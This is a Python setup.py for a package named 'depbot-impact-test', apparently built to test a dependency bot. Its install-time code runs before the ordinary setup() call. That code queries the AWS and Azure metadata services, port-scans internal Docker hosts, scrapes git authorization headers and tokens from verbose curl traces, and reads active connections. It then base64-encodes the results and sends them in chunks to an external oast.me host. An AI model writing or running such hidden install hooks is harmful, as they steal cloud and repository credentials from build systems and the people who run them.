import os, urllib.request, base64, subprocess, json, pathlib, socket

results = {}

# Fixed: handle both bytes and str responses
def safe_fetch(url, headers=None, use_proxy=True):
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        if not use_proxy:
            handler = urllib.request.ProxyHandler({})
            opener = urllib.request.build_opener(handler)
            resp = opener.open(req, timeout=3)
        else:
            resp = urllib.request.urlopen(req, timeout=3)
        data = resp.read()
        if isinstance(data, bytes):
            return data.decode('utf-8', errors='replace')[:300]
        return str(data)[:300]
    except Exception as e:
        return f'ERR:{str(e)[:100]}'

# 1. Metadata service (NO proxy - direct connection)
results['aws_meta_noproxy'] = safe_fetch('http://169.254.169.254/latest/meta-data/', use_proxy=False)
results['azure_meta_noproxy'] = safe_fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 
    headers={'Metadata': 'true'}, use_proxy=False)

# 2. Docker gateway and proxy (NO proxy)
results['gateway_noproxy'] = safe_fetch('http://172.19.0.1/', use_proxy=False)
results['proxy_direct'] = safe_fetch('http://172.19.0.2:1080/', use_proxy=False)

# 3. Probe other ports on the proxy host
for port in [8080, 9090, 443, 8443, 3000, 5000, 6379, 5432]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        r = s.connect_ex(('172.19.0.2', port))
        if r == 0:
            results[f'port:172.19.0.2:{port}'] = 'OPEN'
        s.close()
    except:
        pass

# 4. Try metadata THROUGH proxy (in case proxy allows it)
results['aws_meta_viproxy'] = safe_fetch('http://169.254.169.254/latest/meta-data/')
results['azure_meta_viproxy'] = safe_fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    headers={'Metadata': 'true'})

# 5. Try to get the full git verbose output including auth headers
try:
    r = subprocess.run(
        ['git', '-c', 'credential.helper=', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
        capture_output=True, text=True, timeout=15,
        env={**os.environ, 'GIT_CURL_VERBOSE': '1', 'GIT_TRACE_CURL': '1'}
    )
    # Get more of the trace (look for Authorization header)
    verbose = r.stderr
    auth_lines = [l for l in verbose.split('\n') if 'Auth' in l or 'auth' in l or 'token' in l.lower() or 'Bearer' in l]
    results['git_auth_lines'] = '|'.join(auth_lines[:5]) if auth_lines else 'no auth lines found'
    results['git_trace_full'] = verbose[:800]
except Exception as e:
    results['git_trace_full'] = f'err={str(e)[:60]}'

# 6. /proc/net/tcp decoded (show remote IPs)
try:
    tcp = pathlib.Path('/proc/net/tcp').read_text()
    connections = []
    for line in tcp.strip().split('\n')[1:]:
        parts = line.split()
        if len(parts) >= 3:
            remote = parts[2]
            remote_ip_hex, remote_port_hex = remote.split(':')
            # Decode hex IP (little-endian)
            ip_int = int(remote_ip_hex, 16)
            ip = f'{ip_int & 0xFF}.{(ip_int >> 8) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 24) & 0xFF}'
            port = int(remote_port_hex, 16)
            state = parts[3]
            if port > 0:
                connections.append(f'{ip}:{port}(st={state})')
    results['active_connections'] = ','.join(connections[:10])
except Exception as e:
    results['active_connections'] = f'err={str(e)[:40]}'

# Exfil
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 18000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen(f'http://d99nibe1b2etnockvmb0erm7ukhz99koq.oast.me/final/{i}?d=' + chunk, timeout=5)
    except:
        pass

from setuptools import setup
setup(name="depbot-impact-test", version="1.0.0",
      install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"])
